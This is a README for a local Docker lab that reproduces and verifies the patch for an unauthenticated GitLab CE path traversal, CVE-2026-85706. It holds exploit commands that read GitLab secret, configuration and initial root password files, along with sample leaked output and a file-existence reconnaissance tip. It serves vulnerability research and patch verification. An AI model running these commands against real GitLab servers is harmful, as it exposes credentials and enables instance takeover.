# GitLab CE Docker Lab

A local Docker lab for testing GitLab CE vulnerabilities across specific versions. This lab uses the **official** `gitlab/gitlab-ce` Docker image and covers the full range of available versions via a single tag variable.

**🚨 This Docker container is intended for TEMPORARY USE ONLY 🚨**

---

## Prerequisites

* Docker Desktop running (`docker` and `docker compose` available), with **at least 6 GB of RAM allocated**
* `make`, `curl` (provided by Command Line Tools on macOS)

> **Critical — memory.** GitLab is the most resource-intensive application in this project. Check your memory allocation first: Docker Desktop → **Settings → Resources → Memory → 6 GB minimum**. With less, initialization silently fails or produces random 500 errors.

---

## Getting Started

```bash
cp .env.example .env
# edit GITLAB_TAG in .env to select the version, then:
make up
```

The first startup triggers `gitlab-ctl reconfigure` (Omnibus initialization), which takes **5 to 10 minutes**. The `provision.sh` waits for a valid HTTP response before displaying credentials — do not interrupt.

Once ready:

```
======================================================
 GitLab ready: http://localhost:8080

 Root account:
   Login    : root
   Password : <generated password>

 ⚠️  The initial password expires after 24h.
======================================================
```

---

## Choosing the Version

The version is configured via `GITLAB_TAG` in `.env`:

```
GITLAB_TAG=latest              # latest stable
GITLAB_TAG=19.3.1-ce.0        # specific version (recommended format for CVEs)
GITLAB_TAG=16.7.3-ce.0        # older version
GITLAB_TAG=13.12.15-ce.0      # very old (amd64 only)
```

The format is always `<major>.<minor>.<patch>-ce.0`.

Full list of available tags: https://hub.docker.com/r/gitlab/gitlab-ce/tags

The official image covers the full GitLab CE history from version 11.x. Recent images (14.x and later) are multi-arch and run natively on Apple Silicon. For very old versions (11.x–13.x), uncomment `platform: linux/amd64` in `docker-compose.yml`.

---

## Admin Account

The root password is automatically generated at installation and stored in the container. It expires after 24 hours.

```bash
# Display the current password
make root-password

# Change the password via the web interface
http://localhost:8080/-/user_settings/password/edit
```

---

## Typical Test Loop

```bash
# 1. Set the vulnerable version in .env
#    GITLAB_TAG=19.3.1-ce.0

# 2. Start the lab
make up

# 3. Run the PoC against http://localhost:8080

# 4. Switch to the patched version to verify the fix
#    GITLAB_TAG=19.3.2-ce.0
make reset

# 5. Re-run the PoC — behavior should have changed
```

`make reset` wipes the volumes and reinstalls GitLab from scratch. The first reset triggers a new `reconfigure` (5–10 min). Subsequent resets on the same major version are faster.

---

## CVE-2026-85706 — Path Traversal (CVSS 10.0)

### Description

**CVE-2026-85706** is a path traversal vulnerability affecting the GitLab CE and EE repository API. It was disclosed and patched on September 10, 2026, with a CVSS score of **10.0** (maximum criticality).

The flaw results from two combined issues in the commits/files API:
- missing authentication check on the affected endpoint;
- path confinement bypass allowing traversal outside the repository tree.

An unauthenticated attacker can send a single HTTP request and read the contents of arbitrary files accessible to the GitLab process — including configuration files, secrets, keys, and logs.

**Affected versions:**

| Branch | Vulnerable versions | Patched version |
|--------|---------------------|-----------------|
| 18.7.x – 19.1.x | up to `19.1.7` included | `19.1.8` |
| 19.2.x | up to `19.2.5` included | `19.2.6` |
| 19.3.x | up to `19.3.1` included | `19.3.2` |

Affected endpoint: `POST /api/v4/projects/{id}/repository/files/{path}`

Exploitation indicator in logs: `HTTP POST` requests to `/api/v4/projects/{id}/repository/commits/` or `/repository/files/` containing `file.Path` parameters.

### Test Environment

```
GITLAB_TAG=19.3.1-ce.0   # vulnerable version
GITLAB_TAG=19.3.2-ce.0   # patched version
```

### PoC Dependencies

```bash
python3 -m venv .venv
source .venv/bin/activate
pip install requests
```

### Reproducing the Vulnerability (19.3.1)

```bash
# .env: GITLAB_TAG=19.3.1-ce.0
make reset

./exploit.py --url http://localhost:8080 \
  --file /opt/gitlab/embedded/service/gitlab-rails/config/gitlab.yml
```

**Observed result:**

```
[*] Target: http://localhost:8080  project=1  file=/.../gitlab.yml
[*] Probing Workhorse-bypass forms (no credentials)...
[*] POST /api/v4/projects/1/repository/%66iles/x -> HTTP 400: leak
[+] CONTENT LEAKED via files POST /api/v4/projects/1/repository/%66iles/x:
=========================\n\n  ## GitLab settings\n  gitlab:\n    host: localhost\n
    port: 8080\n    https: false\n ...
```

The `gitlab.yml` file is returned in the HTTP 400 response body with no authentication. File reading occurs **before** the access control check — the content is included in the parameter decoding error message.

Other high-value files:

```bash
# GitLab secrets: encryption keys, internal tokens
./exploit.py --url http://localhost:8080 \
  --file /etc/gitlab/gitlab-secrets.json

# Omnibus config: SMTP, LDAP, S3 secrets, tokens
./exploit.py --url http://localhost:8080 \
  --file /etc/gitlab/gitlab.rb

# Initial root password (valid 24h after installation)
./exploit.py --url http://localhost:8080 \
  --file /etc/gitlab/initial_root_password
```

> **Existence oracle.** For files whose content does not trigger a direct leak (no `%` character), the PoC returns `read-noecho` with HTTP 400. This confirms the file exists and is readable by the GitLab process — useful for reconnaissance.

### Verifying the Patch (19.3.2)

```bash
# .env: GITLAB_TAG=19.3.2-ce.0
make reset

./exploit.py --url http://localhost:8080 \
  --file /opt/gitlab/embedded/service/gitlab-rails/config/gitlab.yml
```

**Observed result:**

```
[*] POST /api/v4/projects/1/repository/%66iles/x -> HTTP 401: read-noecho
[!] No content echo obtained.
```

### Comparative Analysis

| | `19.3.1` (vulnerable) | `19.3.2` (patched) |
|---|---|---|
| Files API response | HTTP **400** + leaked content | HTTP **401** Unauthorized |
| Authentication checked | ❌ After file is read | ✅ Before file is read |
| Content leaked | ✅ YES | ❌ NO |

The patch reintroduced the authentication check **upstream** of file access. On the fixed version, 401 is returned before any read — no content is processed or exposed.

> **Note on PoC classification.** The script displays `read-noecho / "Read happened pre-auth"` for 401 responses on the patched version. This is a false positive in its internal logic: in this context, the 401 means exactly the opposite — authentication blocked the request before any file access.

---

## Running Multiple Labs in Parallel

```bash
make up NAME=gitlab-vuln HTTP_PORT=8081
make up NAME=gitlab-patch HTTP_PORT=8082
```

> Pass the same `NAME` to subsequent commands: `make reset NAME=gitlab-vuln`, `make down NAME=gitlab-vuln`, etc.

---

## Available Commands

| Command | Effect |
|---------|--------|
| `make up` | Start the lab (5–10 min on first launch). |
| `make root-password` | Display the current root password. |
| `make reconfigure` | Reload the GitLab configuration after a change. |
| `make shell` | Open a shell in the GitLab container. |
| `make logs` | Stream logs in real time. |
| `make reset` | Reset the environment to a clean state. |
| `make down` | Stop the container while keeping data. |
| `make clean` | Remove the entire environment (containers and volumes). |

---

## macOS / Apple Silicon

Recent images (14.x and later) are multi-arch — no additional configuration needed. For old versions (11.x–13.x, amd64 only), uncomment `platform: linux/amd64` in `docker-compose.yml`, then run `make reset`. Enable Rosetta in Docker Desktop (**Settings → General → Use Rosetta for x86/amd64 emulation**) for better emulation performance.

---

## Security Reminder

This lab is intentionally isolated locally. Never expose it on a network accessible from outside, and only test code you are authorized to evaluate (public instances within a defined bug bounty scope, your own targets).
